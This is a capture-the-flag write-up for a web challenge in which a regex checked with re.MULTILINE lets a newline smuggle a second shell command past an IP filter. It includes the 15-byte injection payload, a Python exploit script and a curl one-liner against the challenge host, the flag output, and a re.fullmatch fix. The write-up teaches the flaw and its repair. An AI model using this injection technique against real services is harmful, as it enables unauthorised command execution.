# Ping Me: CTF Writeup

**Category:** Web | **Points:** 100 | **Author:** DeadDroid

---

## Challenge Overview

> Tom wants to ping Jerry's IP, but the paranoid network admin built an "unbreakable" firewall around the ping utility. Digits and dots only: absolutely no funny business.

The web app exposes a `/api/ping` endpoint that takes an IP address, validates it through five security checks, then builds and executes a shell command: `ping -c 1 -W 2 {ip}`.

---

## The Vulnerability

The server runs five input checks before executing the command:

|Check|Code|Issue?|
|---|---|---|
|Length|`len(ip) > 15`|✅ Fine|
|No letters|`any(c.isalpha() for c in ip)`|✅ Fine|
|No `$`|`'$' in ip`|✅ Fine|
|Regex|`re.match(r"^[\d.]+$", ip, re.MULTILINE)`|🐛 **Bug here**|
|No `./`|`'./' in NFKC(ip)`|✅ Fine|

The critical mistake is passing `re.MULTILINE` to `re.match()`. With that flag, `$` no longer anchors to the **end of the string**: it matches the **end of a line**. This means the regex validates only the first line of the input and stops there, completely ignoring anything that follows a newline character.

```
Input:  "0\n/???/????????"

re.match sees:
  ^       → position 0          ✓
  [\d.]+  → matches "0"         ✓
  $       → MULTILINE: matches before \n  ✓
  → MATCH RETURNED: filter bypassed!
```

The `isalpha()` check iterates the full string but `?` and `/` are not alphabetic, so that passes too. All five checks are green.

---

## The Payload

```
0\n/???/????????
```

_(15 bytes: exactly at the length limit; `\n` is a literal newline, byte `0x0a`)_

The server constructs:

```bash
ping -c 1 -W 2 0
/???/????????
```

Bash sees **two separate statements**:

1. `ping -c 1 -W 2 0`: pings `0.0.0.0`, harmless.
2. `/???/????????`: a shell glob that expands to any path matching `/[3 chars]/[8 chars]`. In the container this includes `/app/readflag`, a SUID binary (`chmod 4755`) that prints the `$FLAG` environment variable.

Because `/app` sorts before `/bin` alphabetically, `/app/readflag` is executed first; any other glob matches become ignored arguments.

---

## Exploit

```python
#!/usr/bin/env python3
import sys, json, urllib.request

TARGET  = "https://web-ping-me.tracebash.xyz/api/ping"
PAYLOAD = b"0\n/???/????????"   # 15 bytes, \n splits bash statements

req = urllib.request.Request(TARGET, data=PAYLOAD, method="POST")
req.add_header("Content-Type", "text/plain")

with urllib.request.urlopen(req, timeout=15) as resp:
    data = json.loads(resp.read())

print(data.get("output", data))
```

Or as a raw `curl` one-liner:

```bash
curl -s -X POST https://web-ping-me.tracebash.xyz/api/ping \
  -H "Content-Type: text/plain" \
  --data-binary $'0\n/???/????????'
```

---

## Result

```
PING 0 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.024 ms
--- 0 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms

TBCTF{0ld_5ch00l_c0mm4nd_1nj3c710n_0n_573r01d5}
```

**Flag:** `TBCTF{0ld_5ch00l_c0mm4nd_1nj3c710n_0n_573r01d5}`

---

## Fix

Drop the `re.MULTILINE` flag, or replace `re.match()` with `re.fullmatch()` so the pattern must span the **entire** input: no newline smuggling possible:

```python
# Vulnerable
re.match(r"^[\d.]+$", ip, re.MULTILINE)

# Fixed
re.fullmatch(r"[\d.]+", ip)
```

---

## Summary

A single misused regex flag (`re.MULTILINE`) turned an otherwise solid input filter into a command injection sink. By injecting a newline character, we split the shell input into two statements and used a glob pattern to invoke a SUID binary: no letters, no dots-slash, no `$` required.
